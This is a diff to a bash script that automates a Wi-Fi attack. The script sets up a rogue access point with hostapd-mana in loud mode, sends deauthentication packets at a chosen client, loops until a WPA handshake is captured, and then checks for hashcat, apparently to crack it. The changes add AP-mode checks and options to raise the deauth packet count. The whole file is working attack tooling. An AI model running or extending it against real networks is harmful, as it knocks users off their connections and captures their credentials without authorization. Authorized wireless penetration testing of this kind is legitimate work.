@@ -358,17 +358,17 @@ fi
 echo "Rogue AP Interface: $TARGET_AP_IFACE"
 echo "Monitor Interface : $TARGET_MONITOR_IFACE"
 echo "Creating hccapx file: ${TARGET_ESSID}-handshake.hccapx"
-sudo touch ${TARGET_ESSID}-handshake.hccapx
 sleep 0.2
 CONFIG_FILE="hostapd-${TARGET_ESSID}.conf"
 echo "Creating configuration file: $CONFIG_FILE"
 
 cat > "$CONFIG_FILE" <<EOF
-interface=$TARGET_IFACE
+interface=$TARGET_AP_IFACE
 driver=nl80211
 hw_mode=g
 channel=6
 macaddr_acl=0
+mana_loud=1
 auth_algs=1
 ignore_broadcast_ssid=0
 ssid=$TARGET_ESSID
@@ -428,11 +428,26 @@ TARGET_CLIENT_MAC="${client_list[$client_index]}"
 
 echo "Target client selected: $TARGET_CLIENT_MAC"
 
+# Ensure AP interface is in master mode
+echo "Checking AP interface mode for $TARGET_AP_IFACE..."
+
+sudo ip link set "$TARGET_AP_IFACE" down
+sudo iw dev "$TARGET_AP_IFACE" set type __ap 2>/dev/null
+sudo ip link set "$TARGET_AP_IFACE" up
+
+# Validate mode is master (AP)
+ap_mode_check=$(iwconfig "$TARGET_AP_IFACE" 2>/dev/null | grep -i mode | grep -i master)
+if [[ -z "$ap_mode_check" ]]; then
+    echo "❌ $TARGET_AP_IFACE is not in master (AP) mode."
+    exit 1
+fi
+
+echo "✅ Rogue AP interface is set correctly for hostapd-mana."
+
 echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
 launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\" -dd"
 
 sleep 3
-
 echo ""
 echo "Initiating deauthentication attack against target client in another terminal..."
 DEAUTH_COUNT=5
@@ -446,18 +461,30 @@ while true; do
 
     echo "Checking for captured handshake..."
     if ! file "${TARGET_ESSID}-handshake.hccapx" | grep -q "empty"; then
-        echo "Handshake successfully captured!"
+        echo "✅ Handshake successfully captured!"
         break
     else
-        echo "Handshake not captured yet."
+        echo "❌ Handshake not captured yet."
 
         if (( ATTEMPT >= 3 )); then
-            read -rp "Handshake still not captured after $ATTEMPT attempts. Do you want to increase deauth intensity? (y/n): " increase
-            if [[ "$increase" == "y" || "$increase" == "Y" ]]; then
-                read -rp "Enter new deauth packet count (current: $DEAUTH_COUNT): " new_count
-                DEAUTH_COUNT=${new_count:-$DEAUTH_COUNT}
-                echo "Deauth packet count set to: $DEAUTH_COUNT"
-            fi
+            echo ""
+            echo "⚠️ Handshake still not captured after $ATTEMPT attempts."
+            read -rp "Do you want to (y) increase deauth intensity, (n) retry, or (c) continue without handshake? [y/n/c]: " decision
+
+            case "$decision" in
+                y|Y)
+                    read -rp "Enter new deauth packet count (current: $DEAUTH_COUNT): " new_count
+                    DEAUTH_COUNT=${new_count:-$DEAUTH_COUNT}
+                    echo "Deauth packet count set to: $DEAUTH_COUNT"
+                    ;;
+                c|C)
+                    echo "⚠️ Proceeding without handshake..."
+                    break
+                    ;;
+                *)
+                    echo "↻ Retrying with same deauth settings..."
+                    ;;
+            esac
         fi
 
         ((ATTEMPT++))
@@ -466,11 +493,11 @@ done
 
 read -rp "Press [ENTER] to terminate hostapd-mana and proceed to handshake verification..."
 
-
 echo "Stopping hostapd-mana..."
 sudo pkill -f "hostapd-mana \"$CONFIG_FILE\""
-
+sudo airmon-ng check kill
 sleep 2
+
 
 if command -v hashcat &>/dev/null; then
     hashcat_version=$(hashcat --version | sed 's/^v//' | awk '{print $1}')
